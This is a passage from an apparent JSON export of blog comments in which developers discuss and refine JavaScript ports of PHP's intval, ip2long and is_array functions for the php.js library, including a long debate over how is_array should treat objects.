8);\r\n    \/\/ *     returns 3: 42\r\n \r\n    var tmp;\r\n \r\n    if( typeof( mixed_var ) == 'string' ){\r\n        tmp = parseInt(mixed_var);\r\n        if(isNaN(tmp) || !isFinite(tmp)){\r\n            return 0;\r\n        } else{\r\n            return tmp.toString(base || 10);\r\n        }\r\n    } else if( typeof( mixed_var ) == 'number' &amp;&amp; isFinite(mixed_var) ){\r\n        return Math.floor(mixed_var);\r\n    } else{\r\n        return 0;\r\n    }\r\n}\r\n\r\n\/\/ set num to: Infinity\r\nvar num = 1 \/ 0;\r\n\r\n\/\/ using intval_modified to handle Infinity returns: 0\r\nalert( intval_modified(num) );\r\n\r\n\/\/ Output: 0\r\n[\/CODE]\r\n\r\nBasically, the changes are:\r\n[CODE=&quot;Javascript&quot;]if(isNaN(tmp)){[\/CODE]\r\nto:\r\n[CODE=&quot;Javascript&quot;]if(isNaN(tmp) || !isFinite(tmp)){[\/CODE]\r\n\r\nand...\r\n\r\n[CODE=&quot;Javascript&quot;]} else if( typeof( mixed_var ) == 'number' ){[\/CODE]\r\nto:\r\n[CODE=&quot;Javascript&quot;]} else if( typeof( mixed_var ) == 'number' &amp;&amp; isFinite(mixed_var) ){[\/CODE]"},{"date":"2008-05-14 04:33:39","author":"stensi","url":"","comment":"Sorry for double post.  I didn't give the correct code syntax highlighting first time round.\r\n\r\nI noticed I the example I gave had an incorrect call:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nalert( intval_modified(num) );\r\n[\/CODE]\r\n\r\nShould of course be:\r\n\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nalert( intval(num) );\r\n[\/CODE]"},{"date":"2008-05-14 21:55:11","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ stenci: Thanks a lot for your improvements stensi!"},{"date":"2008-05-30 15:10:13","author":"Alex","url":"","comment":"function isInt(x) \r\n{\r\nvar y=parseInt(x);\r\nif (isNaN(y)) return false;\r\nreturn x==y &amp;&amp; x.toString()==y.toString();\r\n}\r\n\r\ntaken from http:\/\/community.livejournal.com\/nullzone\/1223.html"},{"date":"2008-05-31 14:19:59","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Alex: Thank you Alex. Added!"},{"date":"2009-03-06 16:12:52","author":"mkl.keck","url":"","comment":"Imprived function intval:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction intval() {\r\n    var a = arguments;\r\n    var v = a[0];\r\n    var t = typeof(a[0])\r\n    var b = ( (typeof(a[1]) !== 'undefined' &amp;&amp; !isNaN(a[1])) ? parseInt(a[1]) : 10 );\r\n    switch (t.substring(0, 1).toLowerCase()) {\r\n        case 'b':\r\n            return ( (v === true) ? 1 : 0 );\r\n        case 's':\r\n            var r = parseInt(v * 1);\r\n            return ( (!isNaN(v) &amp;&amp; isFinite(v)) ? r.toString(b) : 0 );\r\n        case 'n':\r\n            return ( isFinite(v) ? Math.floor(v) : 0 );\r\n        default:\r\n            return 0;\r\n    }\r\n}\r\n[\/CODE]"},{"date":"2009-09-16 16:37:08","author":"Matteo","url":"","comment":"using this function as above, if I do something like\n\n[CODE]\nalert(is_integer(intval('12')))\n[\/CODE]\n\nI always get FALSE while I'd expect to get TRUE. This happens 'cause if the argument is a string, you return a string and not a number. Why is so? Shouldn't intval always return a number?"},{"date":"2009-09-17 01:04:28","author":"JD Kasinsky","url":"http:\/\/www.caboom.tv","comment":"This function should work in the most cases: \n\n[CODE]\n\tvar v='10px';\n\tv=parseInt(v);\n\talert(v);\n[\/CODE]\n\nBye\nJD\n\n"},{"date":"2009-09-17 05:22:30","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Matteo: Glad you caught that. Fixed in git (also did some other clean-up). For now, see latest version at http:\/\/github.com\/kvz\/phpjs\/commits\/master\/functions\/var\/intval.js"},{"date":"2009-09-17 05:25:12","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@JD Kasinsky: Yes, parseInt will often do the trick, but we're shooting for exact PHP behavior here..."},{"date":"2009-10-06 17:00:06","author":"Stefan Richter","url":"","comment":"I thought this function returns a number like PHP, not a string.\nE.g. expected\n intval('1') + 1 = 2\nbut the result of this is '11'."},{"date":"2009-10-06 20:38:55","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"For now please see http:\/\/github.com\/kvz\/phpjs\/blob\/147b53a515907136c7804fe93f4bfb75a9c39d01\/functions\/var\/intval.js -- the change hasn't yet come through the site."},{"date":"2009-10-08 14:17:24","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Brett Zamir: Thanks for fixing friend. I found there was an issue with the deployment. I fixed that just now."},{"date":"2010-01-05 22:01:10","author":"zeroneta","url":"","comment":"[CODE]\n_.intval = function( a, s )\n{\n\treturn is_bool( a ) ? a * 1 : _._.isFinite( a = _._.parseInt( a, s || 10 ) ) ? a : 0;\n},\n[\/CODE]\n\u6216\u8005\n[CODE]\n_.intval = function( a, s )\n{\n\treturn is_bool( a ) ? a * 1 : _._.parseInt( a, s || 10 ) ? a : 0;\n},\n[\/CODE]"},{"date":"2010-01-05 22:04:05","author":"zeroneta","url":"","comment":"\u540e\u9762\u90a3\u4e2a\u662f\u6709\u95ee\u9898\u7684 \u6ca1\u6709\u628a a \u6b63\u786e \u4f20\u9012\n\n\u8bf7\u4f7f\u7528 \u610f\u601d\u4e3a\u8fd9\u4e2a\u7684\n[CODE]\n_.intval = function( a, s )\n{\n        return is_bool( a ) ? a * 1 : _._.isFinite( a = _._.parseInt( a, s || 10 ) ) ? a : 0;\n},\n[\/CODE]"},{"date":"2010-12-06 14:22:13","author":"Philip Peterson","url":"http:\/\/ironmagma.com\/","comment":"Just want to point out that if the base is 10, we should be using ~~\"32\" (e.g.) instead of parseInt, as it is MUCH faster. http:\/\/jsperf.com\/bitwise-not-not-vs-parseint"},{"date":"2012-04-04 14:33:53","author":"???? ????","url":"http:\/\/an3m1.com\/","comment":"Write more, that\u2019s all I have to say. Literally, it seems as though you relied on the video to make your point. You clearly know what you\u2019re talking about, why waste your intelligence on just posting videos to your blog when you could be giving us something enlightening to read \n"}],"ip2long":[{"date":"2009-01-07 01:44:55","author":"Victor","url":"","comment":"A minimized version:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction ip2long(a){if(a.match(\/^\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}$\/)){var b=a.split('.');return(b[0]*16777216)+(b[1]*65536)+(b[2]*256)+(b[3]*1)}else{return&quot;WTF? 0!&quot;}}\r\n[\/code]"},{"date":"2009-01-07 13:29:45","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Victor: For minified versions we have php.min.js &amp; in the near future our compiler will be able to compress a custom, smaller selection of functions for more speed &amp; less size. For the original source however, we like to keep things as readable as possible.\r\n\r\nMore info: http:\/\/trac.plutonia.nl\/projects\/phpjs\/wiki\/DeveloperGuidelines#Comments\r\n\r\nThanks a lot for contributing though!"},{"date":"2009-01-07 13:36:57","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Victor: That being said: I did take your idea for using fixed numbers, as I don't see any reason why not to, and it will greatly improve the speed of this function. Thx!"},{"date":"2009-08-30 06:45:27","author":"fearphage","url":"http:\/my.opera.com\/fearphage\/","comment":"[code]function ip2long(ip_address) {\r\n  var parts = ip_address.match(\/^(\\d{1,3})\\.(\\d{1,3})\\.(\\d{1,3})\\.(\\d{1,3})$\/);\r\n  return parts\r\n    ? parts[1] * 16777216 + parts[2] * 65536 + parts[3] * 256 + parts[4] * 1\r\n    : false;\r\n}[\/code]"},{"date":"2009-09-04 18:42:52","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ fearphage: I like it :)\nhttp:\/\/github.com\/kvz\/phpjs\/commit\/51ac74a14bb0237b202a4a19dc455f45e92da1d5"}],"is_array":[{"date":"2008-01-04 08:22:01","author":"I. Stan","url":"","comment":"Wouldn't this be better or is it not cross browser? I tested it successfully in IE6, FF2, Opera9 and Safari for Windows.\r\n\r\nfunction is_array(a) {\r\n    return (a.constructor === Array) ? true : false;\r\n}"},{"date":"2008-01-04 09:21:14","author":"Andrey","url":"","comment":"I found a more simple sample:\r\n\r\nfunction is_array(a) {\r\n    return (a instanceof Array);\r\n}"},{"date":"2008-01-04 13:51:40","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Andrey: Thank you I've updated the function!"},{"date":"2008-06-19 11:07:36","author":"Mat","url":"","comment":"Great!"},{"date":"2008-07-07 01:32:00","author":"Marce","url":"","comment":"Tranks kevin, this function is good :), you are very good programer."},{"date":"2008-07-18 08:59:25","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"I'm nowhere near as good as I would like to be. But I'm trying. Glad you find these pages useful though."},{"date":"2008-11-25 18:41:59","author":"Manish","url":"","comment":"function is_array(input)\r\n{\r\n    if( typeof input == 'object' &amp;&amp; input instanceof Array )\r\n\t{\r\n        return true;\r\n    }\r\n\r\n\treturn false;\r\n}"},{"date":"2008-12-01 08:34:12","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Manish: In php.js, javascript objects are indeed like php associative arrays"},{"date":"2008-12-04 21:31:07","author":"Onno Marsman","url":"","comment":"Isn't this the same as\r\n[CODE=&quot;Javascript&quot;]\r\nreturn (mixed_var instanceof Object);\r\n[\/CODE]\r\nor\r\n[CODE=&quot;Javascript&quot;]\r\nreturn (typeof mixed_var=='object');\r\n[\/CODE]\r\n?\r\n\r\nAlso: If mixed_var is an object which has functions then I don't think this function should return true. We could check for that, but in turn it makes you wonder what to do with the implementation of is_object. Does an object needs to have a function? I don't think so. This would mean that is_object(v) and is_array(v) can both be true at the same time, that doesn't make any sense when you think PHP.\r\n\r\nIn my opinion we're taking this to far. I think is_array is clearly meant to only check the type of the variable. I don't think we'll miss out an anything if it doesn't return true on associative arrays. In JS they just aren't arrays but objects so therefor imho for associative arrays is_array should return false and is_object should return true."},{"date":"2008-12-10 17:10:08","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Onno Marsman: Thanks for your input, the thought crossed my mind as well. Well, this is going to be dirty, so please buckle up Onno.. Please bear the following code:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\n    var myResult, input = {'firstname': 'Onno', 'surname': 'Marsman'};\r\n    myResult = filterData(input); \/\/ Will only return array (object) on success\r\n    if (!is_array(myResult)) {\r\n        alert('Data could not be filtered!');\r\n    } else {\r\n        for (key in myResult) {\r\n            \/\/ process data\r\n        }\r\n    }\r\n[\/CODE]\r\n\r\nYou can bet that people are going to use is_array in such ways.\r\n\r\nThough you may argue that people 'd better use: \r\n[CODE=&quot;Javascript&quot;]\r\n    if (false === myResult) {\r\n[\/CODE]\r\n.. to check if filterData() worked correctly - and I would have agree with you, that doesn't mean that I want the first code to fail in php.js, just because we say that's not good coding habit. php.js isn't foolproof but we should try to make it whenever we face decisions like this.\r\n\r\nAlthough it may even mean we have to scan for functions within objects to distinct them from associative arrays, I still think we have to stick with our idea of supporting associative arrays, and not make exceptions in this function.\r\n\r\nI really do agree that is_object &amp; is_array should differ though. So I will work on the function scanning. If you have any ideas on that (or still don't agree with me) please let me know."},{"date":"2008-12-10 18:50:25","author":"Onno Marsman","url":"","comment":"You know I agree with you that php.js should support associative arrays. But I stay with my argument that is_array should return whether a variable is an array. An associative array in JS is an object so it's not an array.\r\n\r\nAbout your example: I would argue what you are suggesting: check for false.\r\n\r\nAbout scanning for functions: that results in some weird situations. We'd also have to change the implementation of is_object and it could theoretically result in situations where is_array returns true on a variable which after a few manipulations returns false. Furthermore: what to do with something like this:\r\n[CODE=&quot;Javascript&quot;]\r\nvar a = [function() { }];\r\n[\/CODE]\r\nIs this an object or an array, or both?\r\nOr what if I would really just want to store some functions in an associative array? It is possible.\r\nWhat I'm saying that the boundary just wouldn't be clear and that would just result in people not trusting these functions.\r\n\r\nWe should keep it simple: is_array is about type checking and returns true when it is an array. It's a very clear boundary, it is much easier to explain, defend and implement. Of course that doesn't mean we shouldn't support associative arrays."},{"date":"2008-12-10 18:52:33","author":"Onno Marsman","url":"","comment":"And of course the current implementation is still the same as the following:\r\n[CODE=&quot;Javascript&quot;]\r\nfunction is_array( mixed_var ) {\r\n    return (mixed_var instanceof Object);\r\n}\r\n[\/CODE]"},{"date":"2008-12-17 12:43:45","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Onno Marsman: Yes, \"associative array in JS is an object so it's not an array\". But we're trying to implement PHP's is_array, and not JavaScript's definition of it.\r\n\r\nSaying that PHP.JS should support associative arrays (objects), and making an exception for the most profound function in this category: is_array, is not making any sense.\r\n\r\nWhat does make sense to me, is your argument that an array of functions is also an array. Thus scanning for functions to make a slight distinction between 'class-like-objects' and 'array-like-objects', can not be achieved that way.\r\n\r\nInsert insightfull comment here ;)"},{"date":"2008-12-17 22:21:21","author":"Onno Marsman","url":"","comment":"I guess you're missing my point.\r\nI'm saying PHP's is_array checks the type of the variable, I think so should php.js' is_array.&lt;br&gt;&lt;br&gt;\r\n\r\nI mean: think of when you would you use this function. I think it would only make sense if you'd wanna check the type of a variable.&lt;br&gt;&lt;br&gt;\r\n\r\nFor functions that expect arrays it's simple: we just treat objects as arrays. Here we just don't know what to expect and there really is no way of knowing whether an object is intended as an array or not.&lt;br&gt;&lt;br&gt;\r\n\r\nRemember the post from someone that wanted to create an array syntax like this: \r\n[CODE=&quot;Javascript&quot;]\r\narray(&quot; 'first' =&gt; 'kevin' &quot;, &quot; 'last' =&gt; 'Zonnevelt' &quot; );\r\n[\/CODE]\r\nYou agreed with me it would weird to create a new syntax that is not really the same as php, while js already has a syntax that is not really the same as php.&lt;br&gt;\r\nI guess you could say the same about this issue: why create a new definition of what an array is that is not really the same as in php, while js already has a definition of what an array is that is not really the same as in php."},{"date":"2008-12-17 22:22:54","author":"Onno marsman","url":"","comment":"How should I post in paragraphs?[br]\r\n[br]\r\ntest. If this worked... never mind ;)"},{"date":"2008-12-24 11:42:38","author":"T.Wild","url":"","comment":"I guess I'm just going to add fuel to the fire on this but IMO what JavaScript sees as an array\/object isn't the issue but what PHP would since that's what we're trying to imitate is it not?\r\n*\r\nI agree in this sort of situation you just don't know what an object is intended as, but i think it's still better to return true for both arrays AND objects at least until a reliable method can be found to tell the difference between an object and an 'associative array', if one exists."},{"date":"2008-12-27 11:34:14","author":"Onno Marsman","url":"","comment":"@T.Wild: Returning true on objects doesn't mimic PHP any better than returning false would. You're looking at it from a &quot;when should it return true&quot; point of view. You could also look at it from a &quot;when should it return false&quot; point of view. From the &quot;return false&quot; point of view I can't really explain the current &quot;return true on object and array&quot; implementation, while &quot;return true only on arrays&quot; can be explained, I think, from both point of views.\r\n[CODE=&quot;Javascript&quot;]\r\n\r\n[\/CODE]\r\nAbout finding a reliable method: I'm pretty sure there isn't one.\r\n[CODE=&quot;Javascript&quot;]\r\n\r\n[\/CODE]\r\nAh well, I would never use this function anyway and would do it the JS way, so I won't make any more fuss about this. I just would hate to see some functions of this library slip off into a state of &quot;behaves a little but more like PHP on some fronts but is really confusing so nobody would ever dare to use it&quot;"},{"date":"2008-12-27 18:21:00","author":"T.Wild","url":"","comment":"To be honest, Onno, put like that I would have to agree.  Better to have it return false and know why then work around it, than have something you think works but be unable to explain why it goes wrong.  I still feel that closer PHP behavior should be the goal, and returning true on associative arrays [objects] does this, but I guess you are unlikely to ever get this because of the basic fact that arrays are objects.  So what's my decision?  I'd have to say the former, but I'm left sitting on the fence somewhat. :)\r\n------------------------------------\r\nNow, if this function does get converted to returning true on TRUE arrays only, when I've been looking around the internet I found this version of is array:\r\nhttp:\/\/www.hunlock.com\/blogs\/Mastering_Javascript_Arrays#quickIDX34\r\n[CODE=&quot;javascript&quot;]\r\nfunction isArray(testObject) {   \r\n    return testObject &amp;&amp; !(testObject.propertyIsEnumerable('length')) &amp;&amp; typeof testObject === 'object' &amp;&amp; typeof testObject.length === 'number';\r\n}\r\n[\/CODE]\r\nI did wonder why something like this was needed but i found an explanation on this site:\r\nhttp:\/\/javascript.crockford.com\/remedial.html\r\n\r\n[value instanceof Array] will only recognize arrays that are created in the same context (or window or frame). JavaScript does not provide an infallible mechanism for distinguishing arrays from objects, so if we want to recognize arrays that are constructed in a different frame, then we need to do something more complicated.\r\n\r\nP.S.  I haven't found any real use for this outside PHP either."},{"date":"2008-12-27 23:07:02","author":"Onno Marsman","url":"","comment":"Wow, that's really weird! I guess your find is a better implementation than &quot;instanceof Array&quot; then. I'm curious about what Kevin thinks about all of this now."},{"date":"2008-12-28 02:42:38","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"In order for PHP-JS to work as a bona-fide framework (which I think it could well become), there is a need for configurability, as seen in this discussion. And while a decision must still be made as to default behavior, I think that we can take advantages features of JavaScript which PHP does not have, in order to allow that configurability without adding additional arguments to the functions (which might have additional ones assigned by PHP in the future): adding properties to the functions themselves.  (My apologies if others have suggested this.)\r\n\r\nMy suggestion is to reserve &quot;JS&quot; as an object for configurability. For example, one might do:\r\n\r\n[CODE=&quot;Javascript&quot;]function is_array (mixed_var) {\r\n    if (arguments.callee.JS.objectsAsArrays) {\r\n        return (mixed_var instanceof Object);\r\n    }\r\n    return mixed_var &amp;&amp; !(mixed_var.propertyIsEnumerable('length')) &amp;&amp; typeof mixed_var === 'object' &amp;&amp; typeof mixed_var.length === 'number';\r\n}\r\nis_array.JS = {};\r\n\r\nis_array.JS.objectsAsArrays = true;\r\nalert(  is_array({})    ); \/\/ true\r\nis_array.JS.objectsAsArrays = false;\r\nalert(  is_array({})    ); \/\/ false[\/CODE]\r\n\r\nThe internal code would simply check for &quot;if ({func_name}.JS.{prop_name})&quot;, (adding the empty JS object right after the function declaration) and act accordingly. I believe this could really be useful, especially for functions with no easy parallel in native JavaScript, but where the nature of JavaScript suggests different possible behaviors for the functions (or for adding other ideas PHP didn't think of).\r\n\r\nWe might even handle this in an OOP way (to more easily allow different configurations for the functions in different contexts), if the &quot;namespace&quot; for our PHP-JS objects were to be given by a constructor function. For example,\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nvar PHP1 = new PHP_JS({is_array:{objectsAsArrays:true}});\r\nvar PHP2 = new PHP_JS({is_array:{objectsAsArrays:false}});\r\nalert(  PHP1.is_array({})    ); \/\/ true\r\nalert(  PHP2.is_array({})   ); \/\/ false\r\nPHP2.JS.is_array.objectsAsArrays = true; \/\/ Can still reconfigure if needed too\r\nalert(  PHP2.is_array({})   ); \/\/ true\r\n\r\nfunction PHP_JS (config) {\r\n    this.JS = {};\r\n    for (var php_js_method in this) { \/\/ Add JS config property for all PHP-JS functions\r\n        if (typeof this[php_js_method] === 'function') {\r\n            this.JS[php_js_method] = {};\r\n        }\r\n    }\r\n    for (var method in config) {\r\n        var configObj = config[method];\r\n        this.JS[method] = configObj;\r\n    }\r\n}\r\nPHP_JS.prototype = {\r\n    is_array : function (mixed_var) {\r\n        if (arguments.callee.JS.objectsAsArrays) {\r\n            return (mixed_var instanceof Object);\r\n        }\r\n        return mixed_var &amp;&amp; !(mixed_var.propertyIsEnumerable('length')) &amp;&amp; typeof mixed_var === 'object' &amp;&amp; typeof mixed_var.length === 'number';\r\n    }\r\n}[\/CODE]\r\n\r\nWhether using the OOP approach or not, your configuration questions (objectsAsArrays, functionsDisallowed, etc.) could be handled.\r\n\r\nFor either of these approaches (of adding properties to the functions or namespace object), PHP constants could be added relating to that function (thus not requiring defining every possible PHP constant or polluting the global namespace further), or meta-data could be attached relating to that function vis-a-vis PHP such as to indicate to which module it belongs (or put the constants within the module information). Thus, a property could be used to indicate to which PHP module a given function belonged (if one was not already using namespaces to do so).  Then one could do things like: extension_loaded(), get_loaded_extensions(), get_extension_funcs(), and get_defined_constants(true) as these functions could reflect upon the meta-data stored for each function.\r\n\r\nAlthough the following is not strictly PHP behavior since Array functions are not an extension in PHP (though we can override this with configuration as described above), we could do things like:\r\n\r\n[CODE=&quot;Javascript&quot;]if (!extension_loaded('array')) {\r\n    function is_array () {\r\n        ....\r\n    }\r\n    function in_array () {\r\n        ....\r\n    }\r\n    ....etc.\r\n}[\/CODE]"},{"date":"2008-12-28 02:54:42","author":"Brett Zamir","url":"","comment":"Sorry, my OOP code had a bug...Here's a fix:\r\n\r\n[CODE=&quot;Javascript&quot;]function PHP_JS (config) {\r\n    this.JS = {};\r\n    for (var php_js_method in this) { \/\/ Add JS config property for all PHP-JS functions\r\n        if (typeof this[php_js_method] === 'function') {\r\n            this.JS[php_js_method] = {};\r\n        }\r\n    }\r\n    for (var method in config) {\r\n        var configObj = config[method];\r\n        this.JS[method] = configObj;\r\n    }\r\n}\r\nPHP_JS.prototype = {\r\n    is_array : function (mixed_var) {\r\n        if (this.JS.is_array.objectsAsArrays) {\r\n            return (mixed_var instanceof Object);\r\n        }\r\n        return mixed_var &amp;&amp; !(mixed_var.propertyIsEnumerable('length')) &amp;&amp; typeof mixed_var === 'object' &amp;&amp; typeof mixed_var.length === 'number';\r\n    } \r\n}\r\n\r\nvar PHP1 = new PHP_JS({is_array:{objectsAsArrays:true}});\r\nvar PHP2 = new PHP_JS({is_array:{objectsAsArrays:false}});\r\nalert(  PHP1.is_array({})    ); \/\/ true\r\nalert(  PHP2.is_array({})   ); \/\/ false\r\nPHP1.JS.is_array.objectsAsArrays = false; \/\/ Can still reconfigure if needed too\r\nPHP2.JS.is_array.objectsAsArrays = true;\r\nalert(  PHP1.is_array({})   ); \/\/ false\r\nalert(  PHP2.is_array({})   ); \/\/ true\r\n[\/CODE]"},{"date":"2008-12-28 11:13:56","author":"Onno Marsman","url":"","comment":"Brett: Isn't this making things a bit to complicated for something that's just meant to help a PHP programmer make the step to JS? I mean: no experienced JS programmer is ever gonna use this function anyway and I don't think a not so experienced one would wanna find out how to configure something like this. I think it would even be easier and clearer to fall back to &quot;instanceof Array&quot; or &quot;instanceof Object&quot;, whichever one they need.\r\nPHP doesn't have this kind of configuration either and if we would introduce it I doubt anybody would use it."},{"date":"2008-12-28 14:16:37","author":"Brett Zamir","url":"","comment":"Hi Onno: Well, for this function alone it would no doubt be overkill (the OOP way), but I don't think that PHP-JS is merely useful in helping students of PHP transition to JS, though that is a good benefit. \r\n\r\n\r\nWhat is useful, I think, is that PHP has defined a vocabulary for a wide range of standard processing people want to do on Strings, Arrays, etc., functions which are completely lacking in JavaScript--a language that was standardized early on, and had little time to acquire even basic utility facilities, despite it being a flexible language).\r\n\r\n\r\nPHP provides a kind of expressive vocabulary to be able to do things, and with which many users may already be familiar with the terminology. No doubt a large part of what people like about PHP is its large number of functions. \r\n\r\n\r\nAnd for is_array(), I think many experienced programmers would be glad to save themselves the trouble of having to type the same long fail-safe string over and over again that you all were discussing (to avoid the different window\/frame problem). \r\n\r\n\r\nPersonally speaking, I'm more drawn to the utility (and elegance) of other functions like array_values() or array_keys(), or even in_array(). I don't want to have to write a for loop every time I need one of them or even when I can use &quot;indexOf() !== -1&quot;, in_array() is so much more elegant.  Seriously, what's wrong with saving yourself time and making your code more intelligible? \r\n\r\n\r\nOf course, some will look down on this because either this is not the &quot;JavaScript way&quot; (if it's OOP, saves lines of code, and doesn't have any negative side effects, I don't see how it isn't) or because it pays homage to a language which is just too darn easy to learn and do useful things with. \r\n\r\n\r\nIt's like people who will respect you if you learn ancient Egyptian but think nothing of you learning Spanish.  If it's useless and difficult, then it deserves praise.  Or when people prefer the status quo of not having an official world auxiliary language because they think it is charming that we can't communicate with each other (or just expect that everyone should spend all of their time mastering various languages, rather than working for a global agreement to have one language (whether English, Esperanto, or whatever could garner the most support) be taught along with native languages in schools around the world). Does humanity really need scores of words for &quot;apple&quot; when we could settle on one language in addition to our native one? (thousands of words, I know, but I'm only talking about reducing lingua francas, not native languages) Does inter-communication need to be only for those with privilege and too much free time?\r\n\r\n\r\nWhy does a JavaScript library (that has no JavaScript standard to work from) need to start from scratch as far as terminology as well as functionality? Isn't it helpful to be able to piggy-back on something already existing?\r\n\r\n\r\nSorry for this diatribe (I'm not at all responding to your honest question), but this just raised the topic for me of all the maligning people do\r\nin other discussions I've had because human beings like to lord over the &quot;right way&quot;, and conversely, proponents of practicality are often too cowed to defend the useful albeit ordinary, while others are afraid to think for themselves and resist the impulse to second-guess oneself when everyone else is criticizing something you find useful. Criticism itself is usually such a waste of time, where we should be honestly discussing in a humble manner (like your nice polite but frank question) which way is better.\r\n\r\n\r\nI'm doing JavaScript for full-time paid work (building Firefox extensions), and I've unabashedly been using some of these utilities. I particularly like array_unique(), trim, and Mozilla equivalents I've made for file_get_contents() and file_put_contents().\r\n\r\n\r\nOh, and I see I'm using your min() function too! :)  Given that you found a need to write a good many lines of code for that function, do you really want to rewrite that each time you need it or give it a non-PHP name? :)"},{"date":"2008-12-28 22:46:22","author":"Onno Marsman","url":"","comment":"Brett: I'm of course talking about this function (and some other) and not the complete library, why else would I bother to participate in any way? You're defending the need of the whole library to me: you really don't need to, I share your opinion about that obviously.\r\n--------\r\nThe in_array function seems useful to me too when you consider the whole frame\/window issue, but that's a problem I don't think I will encounter very often. And when it would return true on objects (as it does now) that whole problem wouldn't even exist, and the function would seem useless to me anyway. And that's why I'm saying I probably would never use this function. My point on configuration making things complicated remains.\r\n------\r\nOne more question to you, Brett: could you please tell me how to post in paragraphs on this site? My posts continue to result in large ugly blobs of text."},{"date":"2008-12-29 01:29:54","author":"Brett Zamir","url":"","comment":"Onno: I thought so, but you could have been  just doing it as a learning exercise. But, honestly, I wasn't targeting it at you really, I just felt I had to get that off my chest. :) Sorry about that. \r\n\r\n\r\nI don't think that configuration is making things complicated unless the default behavior is unreasonable.  Although it's usually nicer to do it by passing in an argument (if you like the PHP-style that is), since we don't really have that option, I think offering a choice is convenient and allows the library to be shared more widely. Imagine, for example, just keeping your PHP functions followed by configuration setup (if you felt the need to customize) all in one file. You could just reuse that without needing to worry about it.\r\n\r\n\r\nWhat do you think about the idea of adding a module property and constants?\r\n\r\n\r\nFor paragraphing, as I only discovered this last post, was to make two lines between each."},{"date":"2008-12-29 10:39:53","author":"Onno Marsman","url":"","comment":"Ah thanks, now at last I can make my posts readable. Let's see if this works...\r\n\r\n\r\nAbout configuration: there's the danger of a lot of discussions being settled with &quot;let's make it configurable&quot; and that will make a lot of things unclear. Without wanting to start a discussion about that topic, in my opinion, this is exactly where most open source PHP CMS products known to me take a wrong turn. You get a lot of imaginary spin offs only by personal preference configuration which have to be maintained, and this causes a lot of bugs: a programmer tends to find and solve a bug only with his preferable configuration.\r\n\r\n\r\nEspecially with a project like this which is generally very simple, I think we should put a lot of effort in keeping it simple. If we have to make decisions we can't all agree with: too bad. Even if I would be the only one to think something should be solved differently and therefor it wouldn't be done that way, I probably wouldn't agree on making it configurable. This would be the case in the discussion about is_array right here: it's just not important enough.\r\n\r\nI'm not saying configuration shouldn't be there at all. There might be some cases where configuration can be a good thing, although I can't think of one right now. Anyway, I think, we shouldn't use it for settling a discussion, and only use it when there is really no alternative.\r\n\r\n\r\nAbout configuration by function parameters: like you said, this is a really bad idea and shouldn't be considered an option indeed.\r\n\r\n\r\nOf course, about all these issues, I can only speak for myself.... I wonder what Kevin has to say about all of these things. He has a lot of reading to do ;)"},{"date":"2008-12-30 15:30:29","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Onno marsman, T. Wild, Brett Zamir: Thanks your insightful comments. Appreciated.\r\n\r\n-- PHP.JS: Brett you have laid out what the project is about, and a couple of your paragraphs should probably make it to the phpjs.org site. Thanks. But in this particular case, you're preaching to the choir ;) We have all invested our precious free time in this project, because we are already convinced of it's purpose (and as it turns out, even more people see even more purposes for it, I have even heard people are trying to bring our PHP power to Adobe AIR ;)\r\n\r\n-- Configurable PHP.JS:\r\nMy vision on the project: I think we should Not try to create a Framework. Let us stick with creating a Library. Others are invited to take our (namespaced \/ compiled) Library and extend it in whatever way they see fit, we should focus on delivering raw PHP power, as close to the original PHP as reasonably possible. This goal should not provide the need for configuration.\r\n\r\nIf it's even possible to have a setup file for a library (and still call it that), it would over-complicate &amp; potentially make things unstable. I side with Onno on that one. Besides: there's lower hanging fruit still to be plucked. \r\n\r\n-- InstanceOf:\r\nT.Wild thanks for your url http:\/\/javascript.crockford.com\/remedial.html . In these ways, working on PHP.JS has helped me to get a better understanding of both languages. That's very cool. I've changed the gettype function to fix the type problems stated in your find. I also implemented (&amp; commented) it in the is_array function.\r\n\r\n-- is_array:\r\nWe once made the decision that PHP.JS should accept associative arrays. I still think we can not make an exception now. Having said we should mimic PHP as much as reasonably possible, I would very much like this code:\r\n[CODE=&quot;Javascript&quot;]\r\nvar combined;\r\nvar keys = ['0', '1', '2'];\r\nvar vals = ['a', 'b', 'c'];\r\n\r\ncombined = array_combine(keys, vals);\r\nif (is_array(combined)) {\r\n    print_r(combined);\r\n}\r\n[\/CODE]\r\nto produce:\r\n[CODE=&quot;Text&quot;]\r\nArray\r\n(\r\n    [0] =&gt; a\r\n    [1] =&gt; b\r\n    [2] =&gt; c\r\n)\r\n[\/CODE]\r\nAnd not ''. I realize that it's choosing between two evils. Maybe it's because I'd rather look at it from an enabling point-of-view, but in my opinion, having it return true on objects (!= 'classes') still is the lesser evil.\r\n\r\n-- Paragraphing: There was a bug in my blog that stopped newlines whenever a CODE block was used. Fixed."},{"date":"2008-12-30 17:15:00","author":"Brett Zamir","url":"","comment":"Well, it's sure a good sign that people are interested in your project, if it's the third item on Google showing up for &quot;PHP is_array&quot; (after the PHP site and a mirror). Congratulations, wow! And that's without &quot;JavaScript&quot; even in the query (its the first with that 